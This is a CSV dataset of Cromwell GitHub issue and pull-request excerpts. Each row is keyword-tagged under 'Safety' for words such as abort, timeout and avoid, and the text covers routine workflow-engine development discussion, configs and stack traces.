Safety,Run mode should default to abort all jobs on CTRL-C,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2794:27,abort,abort,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2794,1,['abort'],['abort']
Safety,"Running the workflow; ```; version 1.0. workflow test {; input {; Array[File]? y = [""some/file/path.txt""]; }. output {; Array[File] x = select_first([y, []]); }; }; ```; on latest `develop` seems to work fine, producing outputs; ```; {; ""test.x"": [""some/file/path.txt""]; }; ```. Is this an accurate simplification of your problem case?. There is a good chance this bug is fixed in 37 onward as a result of https://github.com/broadinstitute/cromwell/pull/4324; >Fixed a regression in Cromwell 36 that could cause operations on empty arrays to fail with a spurious type error. I suspect your workflow got stuck after failing because the `WomArray` code [throws an exception](https://github.com/broadinstitute/cromwell/blob/develop/wom/src/main/scala/wom/values/WomArray.scala#L37) that screws up control flow. I believe this is a ""this should never happen"" case so we did not bother upgrading it to our fancier error handling that encodes failures in the type system to achieve predictable behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4755#issuecomment-474440247:976,predict,predictable,976,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4755#issuecomment-474440247,2,['predict'],['predictable']
Safety,SFS job recovery. Closes #1162 Closes #666,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1319:8,recover,recovery,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1319,1,['recover'],['recovery']
Safety,Safe to merge - the only centaur fails are due to changed message syntax in centaur and unrelated to this change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1616#issuecomment-256419183:0,Safe,Safe,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1616#issuecomment-256419183,1,['Safe'],['Safe']
Safety,"Safety net against long running ""log an event"" actions",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947:0,Safe,Safety,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947,1,['Safe'],['Safety']
Safety,"Sample of a possible new log message thread:; ```; [INFO] [...] [.../TestJesApiQueryManager-1262117937] Running with 1 PAPI request workers; [WARN] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller1 terminated. 0 run creation requests, 5 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; [INFO] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller1 has been removed and replaced by statusPoller2 in the pool of 1 workers; [WARN] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller2 terminated. 0 run creation requests, 5 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; [INFO] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller2 has been removed and replaced by statusPoller3 in the pool of 1 workers. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4671#issuecomment-479685147:295,abort,abort,295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4671#issuecomment-479685147,2,['abort'],['abort']
Safety,Sanity Check,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3117:0,Sanity Check,Sanity Check,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3117,1,['Sanity Check'],['Sanity Check']
Safety,"Scala 2.13 upgrade per CROM-6036. The overwhelming majority of this is nitpicky noise, I added a few comments at sites where that is not the case. Sources of noise:. 1. `Traversable` and the whole `Traversable` family are gone.; 2. Stronger opinions about the presence of absence of parens in function invocations.; 3. `scala.collection.JavaConverters` moved to `scala.jdk.CollectionConverters`; 4. `MapView` introduced with some breaking changes to the usage of maps; 5. Conversion of `Array` to `IndexedSeq` now has to be explicit; 6. Instances of `case` matches being incomplete are now detected where previously they were not; 7. Right-biasing of `Either`s makes for a lot of annoying `toOption` / `swap` instead of `right` / `left`; 8. Type ascriptions required for some anonymous functions; 9. Explicit `.` now required for some method invocations; 10. `Stream` is no more, long live `LazyList`; 11. `Symbol` literal `'` syntax no longer supported; 12. etc etc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6724:590,detect,detected,590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6724,1,['detect'],['detected']
Safety,Scale the HMSASpec ask timeout for jenkins.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4267:23,timeout,timeout,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4267,1,['timeout'],['timeout']
Safety,"Searched the codebase for `request-timeout`, found that we seem to use 40 seconds not the 55 previously discussed. Copied the config stanza from `cromwell/server/src/main/resources/application.conf` to CromIAM.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4615:35,timeout,timeout,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4615,1,['timeout'],['timeout']
Safety,"See https://broadworkbench.atlassian.net/browse/BA-6497. (not sure if I created the issue correctly so to be on the safe side I also report it here, sorry if superfluous)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5561:116,safe,safe,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5561,1,['safe'],['safe']
Safety,See https://doc.akka.io/docs/akka-http/current/routing-dsl/testkit.html#increase-timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4250:81,timeout,timeout,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4250,1,['timeout'],['timeout']
Safety,"Seen in [Jenkins build 577](https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/577/) but also in a couple of my branches, where I seem to be able to reliably trigger it w/ some seemingly unrelated changes. . Sometimes they manifest as timeouts, in other cases the [wrong data is coming back](https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/577/testReport/junit/cromwell.webservice/MetadataBuilderActorSpec/MetadataParser_should_support_nested_lists/). In my branches I'm reliably able to get `should build workflow scope tree from metadata events` fail by simply changing the package of `CromwellApiServiceSpec` (see branch `jg_hmm`). That error is not in this jenkins run, but I've seen those other failures in some of my other experiments (see branch `jg_refactor_reality` although that's just a series of me making strange edits to see what happens)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4288:259,timeout,timeouts,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4288,1,['timeout'],['timeouts']
Safety,"Sending error info to sentry during centaur testing before retrying.; Encrypting sensitive variables using a random key during centaur tests, jic they are sent to sentry.; Rendering secure resources during _all_ tests.; When secure variables cannot be rendered, only fail when secure variables are required, otherwise producing only info/warning messages.; Disabled caches during tests that read `backendStatus` call metadata.; Allow `test_cromwell.sh` to use a centaur config file.; Enable GcsPathBuilderFactory to retry more than zero times.; Lazy load centaur `*.inputs` & `*.options` so that they aren't required to load `*.test` files.; Relatedly, so that one doesn't (try to) accidentally commit the changes, `git rm` the options file that was being rendered.; Moved logback.xml out of transitive core library and into executables, next to application.conf files.; Pin `cwltool` version.; Use a workaround to pass `--timeout` through `run_test.sh` to `cwltest`.; Using `better.files` instead of `java.nio.Path`, and passing `IO` monads further up.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4000:923,timeout,timeout,923,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4000,1,['timeout'],['timeout']
Safety,Set back sensible defaults for abort on terminate,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2811:31,abort,abort,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2811,1,['abort'],['abort']
Safety,Set non-default timeouts on CWL conformance run_test.sh invocation.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3931:16,timeout,timeouts,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3931,1,['timeout'],['timeouts']
Safety,Setting the tmpdir to be word accessible poses a security risk at some high-performance compute clusters. Original idea seems to make it world writabled: https://github.com/broadinstitute/cromwell/pull/2053. I would even prefer to set it to be *only* accessable for the `cromwell` user (mod: `700`)... or just leave it as it was provided...,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721:58,risk,risk,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721,1,['risk'],['risk']
Safety,SgeInitializationActor will explode on abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1112:39,abort,abort,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1112,1,['abort'],['abort']
Safety,"Should we also change the terminology from ""job avoidance"" to call caching?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/285#issuecomment-155520280:48,avoid,avoidance,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/285#issuecomment-155520280,1,['avoid'],['avoidance']
Safety,Shuffle job paths to avoid cache-vs-live collisions [BA-6236],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5415:21,avoid,avoid,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5415,1,['avoid'],['avoid']
Safety,Shuffle job paths to avoid cache-vs-live collisions: Part II [BA-6236],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5429:21,avoid,avoid,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5429,1,['avoid'],['avoid']
Safety,"Side note for those **only** looking to put time limits on commands, and **not** looking for a workaround for cloud bugs-- here's a more-portable time limit option: `timeout`. `timeout` differs slightly in each distro. Example docs:; - https://busybox.net/downloads/BusyBox.html#timeout; - https://www.gnu.org/software/coreutils/manual/html_node/timeout-invocation.html; - https://manpages.debian.org/stretch/coreutils/timeout.1.en.html. The command `timeout` will most likely be unable to help for ""stuck"" cloud jobs. For example, if the command `echo hello world` actually exits but for some unknown reason the cloud VM sticks around forever, then `timeout 5s echo hello world` will likely have the same issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717:166,timeout,timeout,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717,7,['timeout'],"['timeout', 'timeout-invocation']"
Safety,"Similar to other parser-related errors reported by Andrea in WB, [via google](https://www.google.com/search?q=owlapi+thread+safety) I'm not convinced the OWL API is thread safe. Some info/debug logging might expose if multiple threads are trying to access the OWL API, and synchronization might fix it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171:124,safe,safety,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171,2,['safe'],"['safe', 'safety']"
Safety,Similarly I passed in `wdlInputs` instead of `workflowInputs` and got a giant stack trace on the cromwell side but no response (other than timeout) on the client side,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-264953339:139,timeout,timeout,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-264953339,1,['timeout'],['timeout']
Safety,"Since you specifically asked for a ""words"" review, I personally found the CHANGELOG comment came across as a bit defensive (and IMO slightly overplays the certainty of one new heuristic). My suggestion:. > Added a new heuristic for detecting preemption jobs in PAPIv2 based on the error message ""The assigned worker has failed to complete the operation"". Jobs with this message will from now on be treated as preempted rather than failed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5072#issuecomment-511349623:232,detect,detecting,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5072#issuecomment-511349623,1,['detect'],['detecting']
Safety,Slightly better abort behavior in standard backend.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2032:16,abort,abort,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2032,1,['abort'],['abort']
Safety,"So I did some digging. The bad news: a `docker_pull` command will not work. It cannot be implemented at workflow initialization because at that point in time runtime attributes are not known. These are evaluated when the task is executed. This is due to inputs in WDL being dependent on the outputs of other tasks, which is what makes WDL great, so this cannot (easily) be fixed. So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:470,redund,redundant,470,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,2,"['redund', 'timeout']","['redundant', 'timeout-seconds']"
Safety,"So far cromwell is working great on our cluster. Thanks a lot for this splendid effort. However there is one issue we run into that other people might run into as well. Our cluster uses NFS as its filesystem backend. This means that if one node completes a job, it might take a while before the files that were created. In other workflows we can set an I/O timeout option: if the file did not appear within 3 minutes, the job failed. How do we do this in cromwell. All the settings I have available is `number-of-requests`, `per` and `number-of-attempts`. Currently we have; ```HOCON; io {; number-of-requests = 10; per = 10 seconds; number-of-attempts = 180; }; ```; This should make sure that failing files are attempted for 180 seconds, but this is not very elegant. There is a `timeout` option in I/O. But this is the timeout for the I/O operation to respond. If the file is not ""visible"" then the I/O operation will respond immediately, and the job will have failed. Is there a fix to this option in the current cromwell configuration?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3648:357,timeout,timeout,357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3648,3,['timeout'],['timeout']
Safety,"So if you stand up several cromwells, how do you avoid them all trying to; do the summary stuff and clobber eachother? That's the purpose of this; ticket. All the readers would read the summary, but only one should be; writing it. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Fri, Sep 9, 2016 at 11:37 AM, Thib notifications@github.com wrote:. > @geoffjentry https://github.com/geoffjentry I believe that is correct.; > Just to get some clarification on this - why does the summary refresh; > actor need to be disabled to use cromwell as read-only ? I understand that; > the refresh actor writes to the database, but in very low amounts (1 line; > per workflow), and its purpose (as I understand it, @mcovarr; > https://github.com/mcovarr ?) is to help relieve the metadata endpoint; > by avoiding recomputing the current status on every call, which would be; > useful for a read-only cromwell ?; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ABW4g3Ta6a_kXzY1BGl8L_aAEr5duoTpks5qoX0hgaJpZM4J3efD; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950671:49,avoid,avoid,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950671,2,['avoid'],"['avoid', 'avoiding']"
Safety,So it can manipulated safely by concurrent workflow actors in the WorkflowManagerActorSpec and tests pass consistently.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/76:22,safe,safely,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/76,1,['safe'],['safely']
Safety,So successes are not wrapped - only failures are (which the ticket was about). With the exception of the validate endpoint which has a special response format which would have been weird not updating.; It's easy enough to wrap the success too - It just feels risky too me to update the entire API responses format a week before firecloud goes live but if that's fine I can wrap the successes too and let them now. We should tell them anyway that the error format will change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379:259,risk,risky,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379,1,['risk'],['risky']
Safety,"So we need an uber api that tracks preemptions across registered Cromwell; servers and then uses machine learning to make predictions of lowest cost; configuration that meets system resources. Simple.... (joke). On Dec 18, 2016 12:39, ""Jeff Gentry"" <notifications@github.com> wrote:. > @pgrosu <https://github.com/pgrosu> IIRC we use central to avoid some of; > their other large customers in other zones. However note that we *are*; > one of their large customers so choosing the same zone as us might not be; > the best plan for success in avoiding preemptions :); >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAFpE0Z7yysmspq1G1F35bUZzr4Cy7wzks5rJW_LgaJpZM4LPeJB>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259:122,predict,predictions,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259,6,"['avoid', 'predict']","['avoid', 'avoiding', 'predictions']"
Safety,"So, setting `concurrent-job-limit` to 8 did resolve my issue (and I hit another, unrelated issue instead). However, I don't believe this is the ideal way to resolve this. I (and I assume most other users) want maximum concurrency with my jobs, we just want to avoid this error. If we caught this `Too Many Requests` error, and just waited for a few seconds before retrying these requests, it would surely resolve this issue in a cleaner way.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323:260,avoid,avoid,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323,1,['avoid'],['avoid']
Safety,Socket timeout talking to GcsFileSystemProvider,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/826:7,timeout,timeout,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/826,1,['timeout'],['timeout']
Safety,"Some aborted workflows still have ""running"" subworkflows",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3654:5,abort,aborted,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3654,1,['abort'],['aborted']
Safety,"Some background about this fix:; 1. Centaur submits a workflow to Cromwell; 2. Workflow succeeds; 3. Some non-CentaurTestException exception occurs; 4. Centaur swallows it silently and resubmits the workflow.; 5. The resubmitted workflow succeeds using call cached results; 6. Centaur test fails because tasks of the workflow are not expected to be call cached. This fix alters #4 from the above list and makes Centaur to report the exception before resubmitting the workflow. It doesn't solve the flakiness problem itself, but at least we'll see what happened the during the failed attempt. Regarding the non-CentaurTestException which caused flakiness in the first place I suspect the TimeoutExceptions happening in CentaurCromwellClient, but not 100% sure",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6197:687,Timeout,TimeoutExceptions,687,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6197,1,['Timeout'],['TimeoutExceptions']
Safety,"Some light reading for @Horneth and @kshakir. This is largely Frankensteining of ""Olde Style"" code. Known missing or broken, I need to confirm that appropriate tickets exist for the restoration of the following:; - [x] #753 Abort; - [x] #751 Recover; - [x] #749 Preemptibility; - [x] #785 Persistence of any data (note this would not be a ticket to create a KV / metadata service, but to integrate this backend with such a service); - [x] #809 Hashing (prereq for #750); - [x] #750 Caching; - [x] #806 implement Firecloud style auth upload / deletion (the code is not present here); - [x] #808 Retries were removed from command script upload and JES run creation. Lessons learned:; - [x] #811 #812 Actor Factories should be responsible for sanity-checking configs .; - [x] #813 Initialization actors should have the ability to create workflow-level resources that can be shared by the other actors collaborating in the workflow execution. e.g. GCS Filesystems need only be created once per workflow, not for every call.; - [x] It's not clear how workflow logging (or logging in general) should work.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797:224,Abort,Abort,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797,2,"['Abort', 'Recover']","['Abort', 'Recover']"
Safety,"Sorry, that was one run. I have another one where ContinueWhilePossible was the default value and the; same issue happened. On Aug 4, 2017 12:50 PM, ""Thib"" <notifications@github.com> wrote:. > It's working as expected at least, Cromwell does not abort running jobs; > when a workflow fails. It just stops tracking them and fails the workflow; > without starting new jobs.; > ContinueWhilePossible makes Cromwell continue to start new jobs ""while; > possible"" even if some jobs have failed.; > In neither case does Cromwell abort running jobs when the workflow fails; > though.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk9wqG1Sd-sxUhIChB1UaFrpU1rQZks5sU0urgaJpZM4Ot1MJ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320301060:246,abort,abort,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320301060,2,['abort'],['abort']
Safety,Spike: abort 404s,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767:7,abort,abort,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767,1,['abort'],['abort']
Safety,Spoke to @mcovarr in-person. My take on the goal of this PR is to catch database errors related to aborts and either report them back to the sender or log them. :+1: . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2154/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-293336655:99,abort,aborts,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-293336655,1,['abort'],['aborts']
Safety,"Spoke to Khalid, making a replacement ticket to avoid confusion.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-216572364:48,avoid,avoid,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-216572364,1,['avoid'],['avoid']
Safety,"Stack traces show lots of threads on the default dispatcher backed up creating Google credentials like so:. ```; ""cromwell-system-akka.actor.default-dispatcher-49"" #236 prio=5 os_prio=31 tid=0x00007faafe1ff800 nid=0x12903 waiting on condition [0x0000000133659000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000007bb5f1698> (a java.util.concurrent.locks.ReentrantLock$NonfairSync); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:320,Unsafe,Unsafe,320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['Unsafe'],['Unsafe']
Safety,Stacktrace:. ```; java.sql.SQLTimeoutException: Timeout after 5059ms of waiting for a connection.; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:227) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.pool.BaseHikariPool.getConnection(BaseHikariPool.java:182) ~[cromwell.jar:0.19]; at com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:93) ~[cromwell.jar:0.19]; at slick.jdbc.hikaricp.HikariCPJdbcDataSource.createConnection(HikariCPJdbcDataSource.scala:12) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn$lzycompute(JdbcBackend.scala:415) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.conn(JdbcBackend.scala:414) ~[cromwell.jar:0.19]; at slick.jdbc.JdbcBackend$BaseSession.startInTransaction(JdbcBackend.scala:437) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:41) ~[cromwell.jar:0.19]; at slick.driver.JdbcActionComponent$StartTransaction$.run(JdbcActionComponent.scala:38) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906:48,Timeout,Timeout,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/737#issuecomment-214518906,1,['Timeout'],['Timeout']
